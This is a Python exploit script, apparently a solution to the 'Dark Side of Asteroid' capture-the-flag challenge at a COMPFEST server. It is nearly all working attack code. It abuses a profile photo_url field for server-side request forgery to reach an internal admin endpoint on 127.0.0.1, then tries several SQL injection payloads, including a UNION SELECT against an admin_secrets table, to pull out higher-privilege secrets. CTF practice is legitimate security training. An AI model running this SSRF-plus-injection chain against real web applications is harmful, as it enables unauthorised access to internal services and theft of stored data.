#!/usr/bin/env python3
import requests
import urllib.parse

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def register_and_login():
    """Register a new user and login"""
    username = "final_user"
    password = "final123"
    
    # Register
    data = {'username': username, 'password': password}
    requests.post(f"{BASE_URL}/register", data=data)
    
    # Login
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code == 302:
        return response.cookies
    return None

def exploit():
    """Final exploit - trigger SSRF and view profile to see content"""
    print("[+] Dark Side of Asteroid - Final Exploit v2")
    print("[+] =======================================")
    
    # Get session
    cookies = register_and_login()
    if not cookies:
        print("[-] Failed to login!")
        return
    
    print("[+] Successfully logged in!")
    
    # Step 1: Trigger SSRF with empty query to get all secrets with access_level <= 2
    print("[+] Step 1: Triggering SSRF with empty query...")
    
    url = "http://127.0.0.1:5000/internal/admin/search"
    
    data = {'photo_url': url}
    
    try:
        response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
        
        if response.status_code == 200:
            print("[+] SSRF request successful!")
            
            # Step 2: Visit profile page to see the content
            print("[+] Step 2: Visiting profile page to see content...")
            
            profile_response = requests.get(f"{BASE_URL}/profile", cookies=cookies)
            
            if profile_response.status_code == 200:
                # Look for the error preview content
                if "Failed to render as image" in profile_response.text:
                    start = profile_response.text.find("<pre>")
                    end = profile_response.text.find("</pre>")
                    if start != -1 and end != -1:
                        preview = profile_response.text[start+5:end]
                        print(f"[+] Found content in error preview:")
                        print(f"[+] {preview}")
                        
                        # Look for the flag
                        if "COMPFEST" in preview:
                            print("[+] SUCCESS! Found flag!")
                            return
                        elif "Flag" in preview:
                            print("[+] Found flag reference!")
                            return
                        else:
                            print("[+] Got secrets but no flag yet...")
                else:
                    print("[+] No error preview found")
            else:
                print(f"[-] Failed to access profile: {profile_response.status_code}")
        
    except Exception as e:
        print(f"[-] Error: {e}")
    
    # Step 3: Try with SQL injection to get flag with access_level=3
    print("[+] Step 3: Trying SQL injection to get flag...")
    
    # Try different SQL injection payloads
    sql_payloads = [
        "access_level' UNION SELECT secret_name,secret_value FROM admin_secrets WHERE access_level=3--",
        "access_level' OR access_level=3--",
        "access_level' OR access_level>2--",
        "access_level' OR access_level>=3--",
    ]
    
    for sql_payload in sql_payloads:
        print(f"[*] Trying SQL injection: {sql_payload}")
        
        full_url = f"http://127.0.0.1:5000/internal/admin/search?q={urllib.parse.quote(sql_payload)}"
        
        data = {'photo_url': full_url}
        
        try:
            response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
            
            if response.status_code == 200:
                # Visit profile page again
                profile_response = requests.get(f"{BASE_URL}/profile", cookies=cookies)
                
                if profile_response.status_code == 200:
                    if "Failed to render as image" in profile_response.text:
                        start = profile_response.text.find("<pre>")
                        end = profile_response.text.find("</pre>")
                        if start != -1 and end != -1:
                            preview = profile_response.text[start+5:end]
                            
                            if "COMPFEST" in preview:
                                print(f"[+] SUCCESS! Found flag!")
                                print(f"[+] Content: {preview}")
                                return
                            elif "Flag" in preview:
                                print(f"[+] Found flag reference: {preview}")
                                return
                            elif "Access denied" not in preview and "Error" not in preview:
                                print(f"[+] Got interesting response: {preview}")
        
        except Exception as e:
            print(f"[-] Error with {sql_payload}: {e}")
            continue
    
    print("[-] All attempts failed.")

if __name__ == "__main__":
    exploit()
